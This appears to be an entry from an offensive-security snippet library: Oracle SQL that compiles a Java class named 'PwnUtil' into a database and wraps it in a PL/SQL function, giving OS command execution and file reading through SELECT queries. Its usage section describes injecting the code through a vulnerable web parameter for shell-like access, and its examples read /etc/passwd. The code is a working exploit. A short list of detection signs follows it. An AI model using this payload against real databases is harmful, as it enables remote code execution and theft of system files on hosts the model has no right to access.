---
id: f4972802-4a75-404c-a7e8-7b7a9c2d3db2
type: code
language: SQL
verified: true
created_at: '2023-04-06T03:56:35.343210+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tags:
  - oracle
  - java-class
  - rce
  - sql-injection
platforms:
  - Database
  - Oracle
validated: true
---

# Oracle-Create-Java-Class-Direct-SQL

## Code

```sql
/* create Java class */
BEGIN
EXECUTE IMMEDIATE 'create or replace and compile java source named "PwnUtil" as import java.io.*; public class PwnUtil{ public static String runCmd(String args){ try{ BufferedReader myReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream()));String stemp, str = "";while ((stemp = myReader.readLine()) != null) str += stemp + "\n";myReader.close();return str;} catch (Exception e){ return e.toString();}} public static String readFile(String filename){ try{ BufferedReader myReader = new BufferedReader(new FileReader(filename));String stemp, str = "";while((stemp = myReader.readLine()) != null) str += stemp + "\n";myReader.close();return str;} catch (Exception e){ return e.toString();}}};';
END;
/

BEGIN
EXECUTE IMMEDIATE 'create or replace function PwnUtilFunc(p_cmd in varchar2) return varchar2 as language java name ''PwnUtil.runCmd(java.lang.String) return String'';';
END;
/

/* run OS command */
SELECT PwnUtilFunc('ping -c 4 localhost') FROM dual;
```

## Description

This SQL code injects and compiles a Java class 'PwnUtil' into an Oracle database, providing methods to execute OS commands and read files. A PL/SQL function 'PwnUtilFunc' wraps the 'runCmd' method, allowing command execution via SELECT queries. Used in SQL injection attacks to achieve RCE on the database host.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| p_cmd | OS command to execute | 'ping -c 4 localhost' or 'cat /etc/passwd' |
| filename | File path for reading (via separate wrapper) | '/etc/passwd' |

## Usage

Inject this multi-statement SQL via a vulnerable parameter in a web application connected to Oracle. After execution, use SELECT PwnUtilFunc('command') FROM dual; for shell-like access. Ideal for initial RCE in database exploitation chains.

## Detection

- Audit logs for CREATE JAVA SOURCE or EXECUTE IMMEDIATE with Java code.
- Monitor for new functions like PwnUtilFunc in DBA_OBJECTS.
- Network anomalies from unexpected OS commands (e.g., ping to internal hosts).
- File access logs on the DB server for reads to sensitive paths.

## Related

- [[procedures/Oracle-Java-Class-OS-Command-Execution]]
